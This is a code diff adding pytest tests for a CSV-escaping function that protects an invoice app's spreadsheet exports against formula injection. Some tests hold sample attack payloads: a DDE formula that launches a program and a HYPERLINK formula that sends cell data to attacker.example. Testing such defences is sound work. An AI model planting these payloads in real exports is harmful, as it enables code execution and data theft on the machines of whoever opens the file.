@@ -12,6 +12,7 @@ import pytest
 
 from app.core.sanitize import (
     clean_text,
+    csv_safe,
     escape_like,
     safe_extension,
     safe_filename,
@@ -190,3 +191,44 @@ class TestSafeExtension:
         extension rather than the "" that a rejection would give.
         """
         assert safe_extension("invoice." + "a" * 400) == "." + "a" * 10
+
+
+class TestCsvSafe:
+    """A trade name that a spreadsheet would run instead of display.
+
+    The CSV exports are opened in Excel — the endpoint says so, and the BOM is
+    there for the same reason — and the fields in them come off an uploaded
+    invoice, so the content is chosen by whoever sent the invoice.
+    """
+
+    @pytest.mark.parametrize("leader", ["=", "+", "-", "@", "\t", "\r"])
+    def test_a_formula_leader_is_defused(self, leader):
+        assert csv_safe(f"{leader}SUM(A1:A9)") == f"'{leader}SUM(A1:A9)"
+
+    def test_the_dde_payload_is_defused(self):
+        # The one that runs a program rather than merely reading the sheet.
+        payload = "=cmd|'/c calc'!A0"
+        assert csv_safe(payload) == "'" + payload
+
+    def test_the_exfiltration_payload_is_defused(self):
+        # Reads the cell beside it and posts it to whoever put this in the name.
+        payload = '=HYPERLINK("http://attacker.example/?"&A2,"Open")'
+        assert csv_safe(payload).startswith("'=")
+
+    def test_an_ordinary_name_is_untouched(self):
+        assert csv_safe("Sharma Traders Pvt Ltd") == "Sharma Traders Pvt Ltd"
+        assert csv_safe("29ABCDE1234F1Z5") == "29ABCDE1234F1Z5"
+        # Only the *first* character starts a formula.
+        assert csv_safe("A=B Enterprises") == "A=B Enterprises"
+
+    def test_empty_and_none_give_empty(self):
+        assert csv_safe(None) == ""
+        assert csv_safe("") == ""
+
+    def test_the_value_is_not_edited_only_prefixed(self):
+        """Nothing is dropped, so the register still says what the invoice said.
+
+        Truncating or stripping would silently corrupt a supplier's name; one
+        visible apostrophe is recoverable by anyone reading the file back.
+        """
+        assert csv_safe("-Trading Co")[1:] == "-Trading Co"
